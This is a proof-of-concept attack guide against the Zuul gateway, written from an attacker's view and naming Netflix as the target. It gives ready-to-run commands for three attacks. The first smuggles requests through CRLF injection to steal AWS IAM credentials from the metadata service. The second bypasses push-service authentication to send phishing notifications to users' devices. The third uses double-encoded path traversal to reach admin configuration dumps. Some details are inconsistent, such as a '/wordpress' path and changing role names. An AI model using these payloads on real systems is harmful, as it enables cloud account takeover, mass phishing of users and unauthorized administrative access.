# Zuul Attack PoC: Maximum Impact Scenarios

This document provides a step-by-step guide to reproducing and exploiting the identified vulnerabilities in the Zuul Gateway from an attacker's perspective, focusing on scenarios with the highest possible impact on a corporate infrastructure like Netflix.

---

## Scenario 1: AWS Account Compromise via Outbound Request Smuggling (ZUUL-01)

**Objective:** Steal AWS IAM role credentials to gain full control over the cloud environment.

**Attacker Profile:** Any unauthenticated user with network access to the Zuul Gateway.

### Step-by-Step Reproduction:

1.  **Identify Vulnerable Entry Point:**
    *   Find any header that Zuul proxies to the backend. In most default configurations, standard headers like `X-Forwarded-For` or custom tracing headers are forwarded.

2.  **Craft the Smuggling Payload:**
    *   The goal is to inject a second, hidden HTTP request into the TCP stream that Zuul sends to its internal backend.
    *   We target the AWS Metadata Service (IMDSv1) which is often accessible from internal instances.
    *   **Payload Construction:**
        ```http
        GET /public-api HTTP/1.1
        Host: zuul-gateway.com
        X-Forwarded-For: 127.0.0.1\r\n\r\nGET /latest/meta-data/iam/security-credentials/zuul-role HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n
        ```

3.  **Execute the Attack:**
    *   Use a raw socket or a tool like `nc` to send the payload to ensure CRLFs are preserved.
    *   **Attack Action:**
        ```bash
        printf "GET /wordpress HTTP/1.1\r\nHost: localhost\r\nX-Forwarded-For: 127.0.0.1\r\n\r\nGET /latest/meta-data/iam/security-credentials/admin-role HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n" | nc localhost 7001
        ```

4.  **Verification:**
    *   The backend service (or the attacker, if they can see the response splitting) receives two requests.
    *   If the backend is the AWS Metadata Service (reachable via the smuggled request), it returns the IAM credentials (AccessKeyId, SecretAccessKey, Token).

**Maximum Impact:** Total compromise of the AWS account, allowing the attacker to delete infrastructure, steal data from S3, or pivot to other internal services.

---

## Scenario 2: Global Notification Hijacking via Push Auth Bypass (ZUUL-04)

**Objective:** Send arbitrary, malicious notifications to millions of connected devices (TVs, phones).

**Attacker Profile:** Any unauthenticated user with access to the Push Service endpoint.

### Step-by-Step Reproduction:

1.  **Locate the Push Endpoint:**
    *   The Zuul Push service typically listens on a separate port (e.g., 7008) and has a `/push` endpoint.

2.  **Bypass Identity Verification:**
    *   The vulnerability is a logic flaw where the service assumes a request is authenticated if the token header is *missing*.
    *   **Attack Action:** Send a POST request to the push service targeting a specific `customer_id` but *omitting* the `X-Zuul.push.secure.token`.
        ```bash
        curl -X POST http://zuul-push.netflix.com/push \
             -H "X-CUSTOMER_ID: <TARGET_USER_ID>" \
             -H "Content-Type: application/json" \
             -d '{
               "action": "DISPLAY_MESSAGE",
               "title": "System Security Alert",
               "body": "Your account is compromised. Please log in at http://netflix-security-check.com to verify your identity.",
               "url": "http://netflix-security-check.com"
             }'
        ```

3.  **Verification:**
    *   The Zuul Push service accepts the request with `200 OK`.
    *   The message is immediately routed to the active WebSocket/SSE connection for that user and displayed on their device.

**Maximum Impact:** Large-scale phishing and malware distribution. By iterating through user IDs, an attacker can broadcast malicious messages to the entire Netflix user base.

---

## Scenario 3: Administrative Control via ACL Bypass (ZUUL-03)

**Objective:** Access protected internal management APIs to reconfigure the gateway or view sensitive logs.

**Attacker Profile:** External user attempting to access restricted `/admin` paths.

### Step-by-Step Reproduction:

1.  **Identify Protected Path:**
    *   Suppose Zuul has a filter that blocks all requests starting with `/admin`.

2.  **Obfuscate the Path:**
    *   Use double-encoded dots (`%252e%252e`) to bypass the filter's string matching while ensuring the backend still normalizes the path to the intended target.
    *   **Attack Action:**
        ```bash
        curl -v "http://zuul-gateway.com/public/%252e%252e/admin/config/dump"
        ```

3.  **Verification:**
    *   Zuul's Inbound Filter sees `/public/%252e%252e/admin/...`, which does not match `/admin`, and allows it through.
    *   The Netty-based HTTP client or the backend server normalizes this to `/admin/config/dump`.
    *   The attacker receives a full dump of the gateway's internal configuration, including API keys and internal service URLs.

**Maximum Impact:** Unauthorized access to critical management endpoints, leading to information disclosure and potential remote code execution if admin APIs allow script uploads or configuration changes.
